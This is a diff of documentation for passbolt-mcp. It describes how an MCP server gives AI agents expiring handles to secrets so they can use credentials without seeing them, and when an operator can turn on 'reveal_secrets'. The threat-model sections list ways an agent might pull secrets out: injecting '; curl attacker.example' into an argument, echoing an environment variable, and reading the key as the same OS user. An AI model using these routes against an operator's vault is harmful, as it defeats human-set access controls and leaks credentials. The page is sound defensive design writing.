@@ -7,12 +7,41 @@ description: Handles instead of values; commands, API calls and files that passb
 
 > How can we make sure the agent doesn't see the password and can only use it?
 
-When an agent reads a password with `get_secret`, the value lands in its context. From there it
-can reach the model provider, the conversation history and the logs of the client. This page
-explains how passbolt-mcp lets an agent **use** a secret without ever **seeing** it.
+**By default, the agent never sees a secret.** If a password reached the agent, it would be in the
+context of the model: from there it goes to the model provider, the conversation history and the
+logs of the client. So passbolt-mcp lets the agent **use** a secret, never **see** it. Letting it
+see one is a decision of the operator, written in the configuration:
+[`reveal_secrets`](#let-the-agent-see-secrets).
 
-The idea is simple: the agent gets a **handle** to the secret, never its value. passbolt-mcp is
-the only process that decrypts the secret, and it puts it where it is needed itself.
+## In short: a cloakroom ticket
+
+At a cloakroom, you hand in your coat and get a ticket. The ticket says nothing about what is in
+the pockets. It only says "coat number 42", and only this cloakroom can turn it back into the coat.
+
+passbolt-mcp is the cloakroom:
+
+1. The agent asks for the password of the staging database, with `get_secret`.
+2. passbolt-mcp decrypts it, and keeps it.
+3. The agent gets a ticket, a **handle**: `passbolt:secret/7f3c…`. It is random, and expires after
+   15 minutes.
+4. The agent asks passbolt-mcp to do something with the ticket: run a command, call an API, write a
+   file. passbolt-mcp puts the real password there itself.
+5. The agent gets the result, with the password replaced with `[secret]` wherever it shows up.
+
+The agent cannot cheat, because it does not write the commands. The operator declares them in
+advance, and the agent picks one by name:
+
+- Run `echo $PGPASSWORD`? It is not a declared command.
+- Add `; curl attacker.example` to an argument? There is no shell: it is one argument, not a
+  second command.
+- Send the token of an API to another site? The path stays under the declared URL, and redirects
+  are not followed.
+- Write the password into a file, then read the file? The operator chose the file, and passbolt-mcp
+  runs as another OS user than the agent.
+
+The rest of this page is the detail of each step.
+
+## What the agent can do with a handle
 
 | The agent needs to | It calls | The secret goes |
 |---|---|---|
@@ -38,14 +67,14 @@ sequenceDiagram
     M-->>A: output, every form of the password replaced with [secret]
 ```
 
-## Turn it on
+## Set it up
 
-Add `mask_secrets` to `[access]`, and declare the commands the agent may run in `[commands]`:
+Masking is on as soon as `access.secrets` is: the agent gets handles. Declare what it may do with
+them, here the commands it may run in `[commands]`:
 
 ```toml
 [access]
 secrets = true
-mask_secrets = true
 
 [commands.psql-staging]
 description = "Run a query on the staging database"
@@ -64,12 +93,13 @@ Then run `passbolt-mcp check`. It reminds you of the one thing this feature depe
 
 ## Handles
 
-With `access.mask_secrets = true`, the tools that would return a secret return a handle instead.
+The tools that would return a secret return a handle instead.
 
 | Tool | Returns |
 |---|---|
 | `get_secret` | `handle` instead of `value`: `passbolt:secret/` followed by 32 hexadecimal characters. |
 | `generate_password` | `handle` instead of `password`, with the strength of the password. |
+| `get_totp_code` | `handle` instead of `code`, with how long the code stays valid. |
 
 The agent passes the handle wherever it would pass the secret:
 
@@ -251,31 +281,50 @@ The client shows the value to the person in its own window. Depending on the cli
 on screen, or in the history of the conversation, until the person closes it.
 :::
 
+## Let the agent see secrets
+
+Some tasks need the value itself in the context of the agent, for example to type a password into
+a form of a browser the agent drives. Seeing a secret is then a decision of the operator, never of
+the agent:
+
+```toml
+[access]
+secrets = true
+reveal_secrets = true
+```
+
+`get_secret`, `generate_password` and `get_totp_code` then return values. These values go to the
+model provider and stay in the history of the client; `passbolt-mcp check` warns about it.
+
+When it is the person who needs the password, not the agent, keep `reveal_secrets` off and use
+[`show_secret`](#show-a-secret-to-the-person-only).
+
 ## Keep the agent apart from passbolt-mcp
 
 Masking holds only as long as the agent cannot reach what passbolt-mcp holds. An agent with a
 shell, running as the same operating-system user as passbolt-mcp, can read the private key of the
 MCP user and its passphrase, and decrypt everything itself.
 
-With `mask_secrets`, you **MUST** run passbolt-mcp where the agent cannot read its files:
+You **MUST** run passbolt-mcp where the agent cannot read its files:
 
 - as another operating-system user, the key and the passphrase readable by that user only; or
 - in its [Docker image](guides/serve.md#with-docker), the configuration directory mounted for the
   container only.
 
-`passbolt-mcp check` prints this reminder whenever `mask_secrets` is on.
+`passbolt-mcp check` prints this reminder whenever `access.secrets` is on.
 
 ## Limits
+
+See also [what masking does not protect](security.md#what-masking-does-not-protect).
 
 | Limit | What to do |
 |---|---|
 | An agent with a shell, as the same OS user as passbolt-mcp, bypasses everything. | [Keep the agent apart](#keep-the-agent-apart-from-passbolt-mcp). |
 | A command that prints the secret transformed in another way (reversed, encrypted, one character per line) defeats the scrubbing. | Declare commands that do not print their secrets. The agent cannot change them. |
 | What the secret opens, such as a database session, is in the hands of the agent. | Masking protects the credential, not what it unlocks. Passbolt shares, `scope.folders`, `[confirm]` and the audit still limit what it reaches. |
-| `get_totp_code` returns the code itself. | A TOTP code is valid for seconds. Leave `get_totp_code` out with `deny_tools` if it matters. |
 | A template whose target the agent can read gives the secrets back. | Put the targets of `[templates]` where the agent cannot read. |
 | What an API returns can include data the secret protects. | Declare only the APIs, and the methods, the task needs. |
-| Without `mask_secrets`, `get_secret` still returns values. | Turn `mask_secrets` on, or deny `get_secret` and let commands take resource ids. |
+| With `reveal_secrets`, the tools return values. | Leave it off. Use `show_secret` when the person needs the password. |
 
 ## Combine it with the other rules
 
